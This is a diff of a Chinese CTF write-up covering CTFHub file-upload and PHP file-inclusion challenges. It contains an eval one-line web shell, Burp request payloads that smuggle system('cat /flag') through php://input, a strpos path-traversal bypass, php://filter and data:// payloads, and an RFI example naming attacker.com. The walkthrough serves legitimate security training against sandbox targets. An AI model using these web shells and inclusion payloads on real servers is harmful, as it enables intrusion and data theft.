@@ -1544,7 +1544,7 @@ AddType application/x-httpd-php .jpg
 > 上传文件相对路径
 > upload/.htaccess
 
-我们可以编写`PHP`一句话木马，用`burp suite`抓包后修改成`.jpg`后缀和文件类型`image/jpeg`后上传。
+我们可以编写`PHP`一句话木马，用`Burp Suite`抓包后修改成`.jpg`后缀和文件类型`image/jpeg`后上传。
 
 ```php
 <?php @eval($_POST['t0ur1st']); ?>
@@ -1619,7 +1619,7 @@ MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类
 <?php @eval($_POST['t0ur1st']); ?>
 ```
 
-用`burp suite`抓包修改HTTP请求头的`Content-Type`字段为`image/jpeg`即可。
+用`Burp Suite`抓包修改HTTP请求头的`Content-Type`字段为`image/jpeg`即可。
 
 ```
 POST / HTTP/1.1
@@ -1724,7 +1724,7 @@ GIF89a
 
 > 文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件
 
-用`burp suite`修改HTTP请求中的MIME类型`Content-Type: image/jpeg`。
+用`Burp Suite`修改HTTP请求中的MIME类型`Content-Type: image/jpeg`。
 
 ```
 POST / HTTP/1.1
@@ -1912,7 +1912,7 @@ GIF89a
 <?php @eval($_POST['t0ur1st']); ?>
 ```
 
-我们需要用`burp suite`抓包修改`POST`请求。
+我们需要用`Burp Suite`抓包修改`POST`请求。
 
 文件路径为`/?road=/var/www/html/upload/1.php%00.jpg`，文件名`filename="1.php%00.jpg"`。
 
@@ -1987,14 +1987,14 @@ GIF89a
 <?php @eval($_POST['t0ur1st']); ?>
 ```
 
-用`burp suite`抓包修改`POST`请求中的`MIME`类型后，靶机显示信息如下：
+用`Burp Suite`抓包修改`POST`请求中的`MIME`类型后，靶机显示信息如下：
 
 > 上传文件相对路径
 > upload/1.
 
 很明显，文件后缀名被替换掉了，根据题目名称，尝试使用双写后缀绕过，即上传文件名为`1.pphphp`。
 
-用`burp suite`抓包修改`POST`请求，双写后缀绕过。
+用`Burp Suite`抓包修改`POST`请求，双写后缀绕过。
 
 ```
 POST / HTTP/1.1
@@ -2244,5 +2244,409 @@ Found flag file: /var/www/html/flag_2202129874.php
 === Read flag content ===
 string(33) "ctfhub{d0fcbbf8ba8db617979a634d} "
 ```
+
+------
+
+### 文件包含
+
+在PHP中常见的文件包含函数有：`include()`，`require()`，`include_once()`，`require_once()`。
+
+进入靶机后，直接就是`PHP`代码审计，发现`file`参数能用`include`包含文件但是过滤掉了`flag`关键字。
+
+#### 解法一：文件包含`shell.txt`。
+
+```php+HTML
+<?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if (!strpos($_GET["file"], "flag")) {
+        include $_GET["file"];
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?>
+<hr>
+i have a <a href="shell.txt">shell</a>, how to use it ?
+i have a shell, how to use it ?
+```
+
+点击链接查看`shell.txt`，其内容如下：
+
+```php
+<?php eval($_REQUEST['ctfhub']);?>
+```
+
+我们可以通过`file`参数传递`shell.txt`，使得靶机调用`include`文件包含`shell.txt`。
+
+用`HackBar`构造`POST`请求访问`/?file=shell.txt`，先用`ctfhub=phpinfo();`测试一下，可以看到靶机的`PHP`相关信息。
+
+直接用`AntSword`连接靶机，可以在`/flag`中看到`flag`。
+
+或者用`HackBar`查找并访问`/flag`。
+
+```bash
+ctfhub=system('ls /');
+```
+
+> bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+>
+> ------
+>
+> i have a [shell](http://challenge-9e034ed972f6158d.sandbox.ctfhub.com:10800/shell.txt), how to use it ?
+
+```php
+ctfhub=var_dump(file_get_contents('/flag'));
+```
+
+> string(33) "ctfhub{80faa4c6d73af97369e880a6} "
+>
+> ------
+>
+> i have a [shell](http://challenge-9e034ed972f6158d.sandbox.ctfhub.com:10800/shell.txt), how to use it ?
+
+提交`ctfhub{80faa4c6d73af97369e880a6}`即可。
+
+------
+
+#### 解法二：`strpos`黑名单绕过法
+
+重新审计关键代码信息。
+
+`strpos($haystack, $needle)` 用于查找字符串 `$needle` 在另一个字符串 `$haystack` 中首次出现的位置。如果找到，返回值是第一次出现的索引位置（从0开始计算）。如果没找到，返回`false`。
+
+```php
+if (isset($_GET['file'])) {
+    if (!strpos($_GET["file"], "flag")) {
+        include $_GET["file"];
+    } else {
+        echo "Hacker!!!";
+    }
+}
+```
+
+攻击者可以直接请求包含名为`flag`的文件，比如`?file=flag`。 `strpos("flag", "flag")` 返回值是`0`，非零即真，`if(!0)`即`if(true)`，因此`include $_GET["file"]`成功执行。开发者本来想阻止这个操作，但由于逻辑处理考虑不周，反而允许了攻击者绕过黑名单。
+
+此外，攻击者能尝试路径遍历等方式，只要确保 `flag` 这个词出现在路径的开头部分，就能绕过过滤。
+
+`php`的网站目录通常在`/var/www/html/`，我们可以尝试`?file=flag/../../../../flag`，以此来访问靶机服务器系统根目录中的`flag`文件。
+
+分析路径解析过程（当前脚本所在目录为 `/var/www/html/`）：
+
+- 起始点：`/var/www/html/`（这是执行脚本的当前目录）
+- 拼接`flag/`：`/var/www/html/flag/`（尝试进入一个名为 `flag` 的子目录）
+- 第一个`../`：回溯到上一级目录`/var/www/html/`
+- 第二个`../`：继续回溯到上一级目录`/var/www/`
+- 第三个`../`：继续回溯到上一级目录`/var/`
+- 第四个`../`：继续回溯到根目录`/`
+- 最后拼接上 flag：即访问根目录中的文件`/flag`
+
+所以，`include "flag/../../../../flag";`的执行效果为访问根目录下的`flag`文件`/flag`。
+
+------
+
+### php://input
+
+`php://input`是`PHP`中的一个只读数据流，用于获取`POST`、`PUT`、`PATCH`等请求体中的原始数据，不受`php.ini`中`post_max_size`以外的表单解析配置影响（如`upload_max_filesize`、`enable_post_data_reading`）。
+
+**`php://input`与`$_POST`的区别：**
+
+|     特性     |              php://input              |                            $_POST                            |
+| :----------: | :-----------------------------------: | :----------------------------------------------------------: |
+| 数据格式支持 | 任意格式（JSON/XML/ 二进制 / 纯文本） | 仅支持`application/x-www-form-urlencoded`或`multipart/form-data` |
+| 数据读取方式 |     流式读取，可按需读取部分内容      |                一次性解析为关联数组，占用内存                |
+| 文件上传支持 |     不解析文件，仅读取原始字节流      |       自动解析`multipart/form-data`中的文件到`$_FILES`       |
+|   内存占用   |            低（流式读取）             |                     高（全部加载到内存）                     |
+
+**基本读取语法：**
+
+```php
+// 方式1：一次性读取全部请求体（推荐）
+$rawData = file_get_contents('php://input');
+ 
+// 方式2：流式读取（适合超大请求体）
+$handle = fopen('php://input', 'r');
+$rawData = '';
+while (!feof($handle)) {
+    $rawData .= fread($handle, 1024); // 每次读取1KB
+}
+fclose($handle);
+```
+
+**主要应用场景：**‌
+
+- ‌**API 开发**‌：处理前后端分离时的 JSON 数据，避免 `$_POST` 的自动解析限制。
+- ‌**文件上传**‌：接收图片、文件等二进制流数据，保存到服务器。
+- ‌**RESTful 接口**‌：读取 PUT/PATCH 请求的原始数据，用于资源更新。
+- ‌**大文件或流式数据处理**‌：通过流式读取（如 `fopen` 配合 `fread`）减少内存占用，避免一次性加载超大请求体。
+
+**使用注意事项：**‌
+
+- ‌**数据格式与编码**‌：`php://input` 返回原始二进制数据，需根据请求头（如 `Content-Type`）手动解析（如 JSON 解码），并注意字符编码（如 UTF-8）。
+- ‌**请求方式限制**‌：仅适用于`POST`、`PUT`、`PATCH`等非`GET`请求，`GET`请求无请求体，读取结果为空。
+- ‌**内存与性能**‌：读取超大请求体时可能触发 `memory_limit` 限制，建议使用流式读取而非 `file_get_contents()` 一次性加载。
+- ‌**配置依赖**‌：请求体大小受 `php.ini` 中 `post_max_size` 限制（默认 8MB），超出时 `php://input` 读取为空，需调整配置。
+- ‌**避免重复读取**‌：流只能读取一次，第二次读取返回空，需将数据保存到变量复用。
+- ‌**安全性**‌：直接处理原始数据需验证和过滤输入，防止注入攻击等安全风险。
+- **使用前提**：`php://input`伪协议是`PHP`中用于读取原始`POST`数据的流包装器，它不受`:ml-search-more[allow_url_fopen]{text="allow_url_fopen"}`设置的影响，但依赖于`allow_url_include`来启用从URL（包括伪协议）包含或执行代码的能力。‌
+
+进入靶机后，直接就是`PHP`代码审计，如果`file`参数传递的字符串前六位是`php://`则文件包含`file`。
+
+```php+HTML
+<?php
+if (isset($_GET['file'])) {
+    if ( substr($_GET["file"], 0, 6) === "php://" ) {
+        include($_GET["file"]);
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?>
+<hr>
+i don't have shell, how to get flag? <br>
+<a href="phpinfo.php">phpinfo</a>
+i don't have shell, how to get flag?
+phpinfo
+```
+
+点击`phpinfo`后，`Ctrl+F`搜索`allow_url_include`，可以看到以下信息：
+
+|     Directive     | Local Value | Master Value |
+| :---------------: | :---------: | :----------: |
+|  allow_url_fopen  |     On      |      On      |
+| allow_url_include |     On      |      On      |
+
+用`HackBar`构造`POST`请求访问`/?file=php://input`，传递数据`<?php system("ls /"); ?>`没反应。
+
+因为`file`参数需要通过`GET`请求传递，而`php://input`仅适用于`POST`、`PUT`、`PATCH`等非`GET`请求。
+
+用`Burp Suite`抓包，先利用`GET`请求传参，构造`php://input`伪协议，再夹带`POST`请求体数据。
+
+```
+GET /?file=php://input HTTP/1.1
+Host: challenge-814628a6e9c7e0da.sandbox.ctfhub.com:10800
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+<?php system("ls /"); ?>
+```
+
+右键`Send to Repeater`，再将`Intercept`放行，靶机显示的信息如下：
+
+> bin boot dev etc flag_21958 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+
+在`Repeater`中，添加`<?php system("cat /flag_21958"); ?>`后发送请求。
+
+```
+GET /?file=php://input HTTP/1.1
+Host: challenge-814628a6e9c7e0da.sandbox.ctfhub.com:10800
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+Content-Length: 35
+
+<?php system("cat /flag_21958"); ?>
+```
+
+可以在`Response`中看到信息如下：
+
+> ctfhub{781b76a00bff98d4ecd37e4f}
+> <hr>
+> i don't have shell, how to get flag? <br>
+> <a href="phpinfo.php">phpinfo</a>
+
+提交`ctfhub{781b76a00bff98d4ecd37e4f}`即可。
+
+------
+
+### 远程包含
+
+远程文件包含（RFI）是一种安全漏洞，当Web应用程序使用用户控制的输入作为文件路径参数，并通过PHP函数（如 `include`、`require`）从远程服务器加载和执行文件时可能发生。‌
+
+RFI漏洞的核心在于程序未对用户输入进行严格过滤，允许攻击者指定远程文件的URI（如 `http://` 或 `ftp://`），从而引入并执行恶意代码。‌‌成功利用RFI通常需要满足以下条件：
+
+- PHP配置中 `:ml-search-more[allow_url_fopen]{text="allow_url_fopen"}` 设置为 `On`（默认开启）。
+- `:ml-search-more[allow_url_include]{text="allow_url_include"}` 设置为 `On`（默认关闭，需手动启用）。
+- 目标服务器能够访问远程URL，且远程文件的文件类型与服务器解析环境兼容（例如，若目标服务器解析PHP，远程文件通常不应为PHP格式）。‌
+
+远程文件包含（RFI）与本地文件包含（LFI）的区别：RFI和LFI的原理相似，均源于未过滤的用户输入，但攻击载体不同：LFI仅限于包含本地服务器上的文件（如 `../etc/passwd`），而RFI允许包含远程服务器上的文件（如 `http://attacker.com/malicious.php`）。 因此，RFI的威胁通常更高，因为它可能直接执行远程代码。
+
+防止RFI漏洞需采取以下措施：
+
+- 禁用 `allow_url_fopen` 和 `allow_url_include` 配置选项。
+- 对文件包含函数的参数实施严格的白名单验证，避免直接使用用户输入。
+- 使用静态文件路径或安全函数（如 `:ml-search-more[basename()]{text="basename()"}`）过滤输入。‌
+
+回到题目，进入靶机后就是`PHP`代码审计。
+
+```php+HTML
+<?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if (!strpos($_GET["file"], "flag")) {
+        include $_GET["file"];
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?>
+<hr>
+i don't have shell, how to get flag?<br>
+<a href="phpinfo.php">phpinfo</a>
+```
+
+又是这个`strpos($_GET["file"], "flag")`，在前面的文件包含题中，我已经写道了可以利用`strpos`来绕过黑名单，攻击`payload`为`?file=flag/../../../../flag`，直接可以拿到`flag`。
+
+此外，我们可以继续使用`php://input`伪协议，做法跟前面的`php://input`题一样。
+
+点击`phpinfo`后，`Ctrl+F`搜索`allow_url_include`，可以看到以下信息：
+
+|     Directive     | Local Value | Master Value |
+| :---------------: | :---------: | :----------: |
+|  allow_url_fopen  |     On      |      On      |
+| allow_url_include |     On      |      On      |
+
+因为`file`参数需要通过`GET`请求传递，而`php://input`仅适用于`POST`、`PUT`、`PATCH`等非`GET`请求。
+
+用`Burp Suite`抓包，先利用`GET`传参，请求`?file=php://input`，再夹带`POST`请求体数据。
+
+```
+GET /?file=php://input HTTP/1.1
+Host: challenge-b83b77499cce90b5.sandbox.ctfhub.com:10800
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+<?php system("cat /flag"); ?>
+```
+
+直接在`Intercept`中抓包修改放行，可以在靶机看到以下信息：
+
+> ctfhub{85116e06acba01f64cdce3cd}
+>
+> ------
+>
+> i don't have shell, how to get flag?
+> [phpinfo](http://challenge-b83b77499cce90b5.sandbox.ctfhub.com:10800/phpinfo.php)
+
+提交`ctfhub{85116e06acba01f64cdce3cd}`即可。
+
+------
+
+### 读取源代码
+
+在这儿写点笔记总结一下常见的`php`伪协议吧。
+
+#### 常见的`php`伪协议
+
+|      php伪协议      |        `allow_url_fopen`        |       `allow_url_include`       |
+| :-----------------: | :-----------------------------: | :-----------------------------: |
+|      `file://`      |             off/on              |             off/on              |
+|   `php://filter`    |             off/on              |             off/on              |
+|    `php://input`    |             off/on              | <font color="#ff0000">on</font> |
+|      `data://`      | <font color="#ff0000">on</font> | <font color="#ff0000">on</font> |
+|      `zip://`       |             off/on              |             off/on              |
+| `compress.bzip2://` |             off/on              |             off/on              |
+| `compress.zlib://`  |             off/on              |             off/on              |
+
+`file://`能访问本地文件系统，通常用于读取本地文件，用法为`file://[文件的绝对路径和文件名]`，其不受`allow_url_fopen`与`allow_url_include`的影响。比如：
+
+```
+?file=file://D:/soft/phpStudy/WWW/readme.txt
+```
+
+`php://`伪协议用于访问各个输入/输出流，在CTF中经常使用的是`php://filter`和`php://input`。通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。
+
+`php://filter`可以读取源代码并显示`base64`编码后的字符串，可选参数有`read`和`write`，必选参数为`resource`，`resource`用于指定要筛选过滤的数据流。比如：
+
+```
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+`php://input`是`PHP`中的一个只读数据流，用于获取`POST`、`PUT`、`PATCH`等请求体中的原始数据。
+
+`php://input`只有在开启`allow_url_include`时才能使用。使用方法比如：
+
+```
+http://127.0.0.1/cmd.php?file=php://input
+
+[POST DATA] <?php system("cat /flag"); ?>
+```
+
+`data://`协议的使用前提是需要同时开启`allow_url_fopen`和`allow_url_include`。
+
+```
+?file=data://text/plain,<?php phpinfo();?>
+?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+```
+
+`zip://`, `bzip2://`, `zlib://`均属于压缩流，可以访问压缩文件中的子文件，而且无需指定后缀名。
+
+```
+?file=zip://文件路径
+?file=compress.bzip2://文件路径
+?file=compress.zlib://文件路径
+```
+
+------
+
+#### php://filter/read
+
+回到这道题——读取源代码。
+
+进入靶机后，直接就是`PHP`代码审计，如果`file`参数传递的字符串前六位是`php://`则文件包含`file`。通常，`php://filter/read`用于读取源码，`php://input`用于执行`php`代码。
+
+```php+HTML
+<?php
+error_reporting(E_ALL);
+if (isset($_GET['file'])) {
+    if ( substr($_GET["file"], 0, 6) === "php://" ) {
+        include($_GET["file"]);
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?>
+<hr>
+i don't have shell, how to get flag? <br>
+flag in <code>/flag</code>
+```
+
+我们可以使用`?file=php://filter/read=convert.base64-encode/resource=/flag`来获取`base64`编码后的`flag`内容。发送`GET`请求后，靶机显示的信息如下：
+
+> Y3RmaHVie2IzNWU2NmI0NTBhMWE0ZGU0ZTRkMzM2NX0K
+>
+> ------
+>
+> i don't have shell, how to get flag?
+> flag in `/flag`
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。
+
+```bash
+C:\Users\tyd>php -r "var_dump(base64_decode('Y3RmaHVie2IzNWU2NmI0NTBhMWE0ZGU0ZTRkMzM2NX0K'));"
+string(33) "ctfhub{b35e66b450a1a4de4e4d3365}
+"
+```
+
+提交`ctfhub{b35e66b450a1a4de4e4d3365}`即可。
 
 ------
